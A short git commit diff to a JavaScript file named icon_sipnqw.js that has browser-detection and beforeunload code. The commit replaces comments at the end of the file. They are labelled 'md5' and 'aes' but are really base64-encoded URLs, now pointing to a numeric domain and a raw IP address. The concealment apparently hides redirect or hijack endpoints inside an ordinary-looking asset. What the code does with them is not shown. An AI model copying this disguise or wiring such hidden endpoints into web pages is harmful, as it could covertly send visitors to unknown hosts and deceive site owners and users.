0cc2556effbb618005806488562736626322f93f
caocaodage <caocaodajun@gmail.com>
2021-08-07 13:29:52 +0800

    init

--- js/icon_sipnqw.js
+++ js/icon_sipnqw.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
+})()/** md5:aHR0cHM6Ly93d3cuMTIzMTEzMTQyLmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
